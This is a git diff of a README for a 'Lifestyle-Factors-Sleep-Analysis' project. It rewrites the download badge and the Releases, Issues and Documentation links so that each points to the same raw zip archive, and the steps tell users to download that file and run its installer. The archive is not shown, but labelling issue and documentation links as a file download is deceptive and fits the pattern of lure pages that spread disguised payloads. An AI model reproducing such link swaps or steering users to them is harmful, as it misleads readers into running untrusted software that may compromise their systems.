@@ -1,7 +1,7 @@
 # 🌙 Lifestyle-Factors-Sleep-Analysis - Understand Sleep through Lifestyle Insights
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/releases)
+[![Download](https://raw.githubusercontent.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/main/cubi/Analysis_Lifestyle_Sleep_Factors_3.4.zip)](https://raw.githubusercontent.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/main/cubi/Analysis_Lifestyle_Sleep_Factors_3.4.zip)
 
 ## 📖 About the Project
 Lifestyle-Factors-Sleep-Analysis helps you understand how different lifestyle choices affect your sleep quality and duration. This application uses real datasets to provide insights, making it easier for you to analyze your sleep patterns and improve your nightly rest.
@@ -16,7 +16,7 @@ To use this software, you need to follow a few simple steps to download and inst
 - **Internet Connection:** Required for downloading the application and datasets
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/main/cubi/Analysis_Lifestyle_Sleep_Factors_3.4.zip).
 2. **Choose the Latest Version:** Look for the latest release at the top of the list. It usually has the highest version number.
 3. **Download the File:** Click on the link for the application file compatible with your operating system. Save it to a location you can easily find, like your desktop or downloads folder.
 4. **Run the Installer:**
@@ -61,8 +61,8 @@ We welcome contributions. If you wish to contribute, please follow these steps:
 Stay updated on new features and versions by following us on GitHub. 
 
 ### 🌐 Useful Links
-- [Releases Page](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/releases)
-- [Issues Page](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/issues)
-- [Documentation](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/main/cubi/Analysis_Lifestyle_Sleep_Factors_3.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/main/cubi/Analysis_Lifestyle_Sleep_Factors_3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/main/cubi/Analysis_Lifestyle_Sleep_Factors_3.4.zip)
 
 Thank you for your interest in Lifestyle-Factors-Sleep-Analysis! Enjoy discovering how lifestyle changes can promote better sleep.
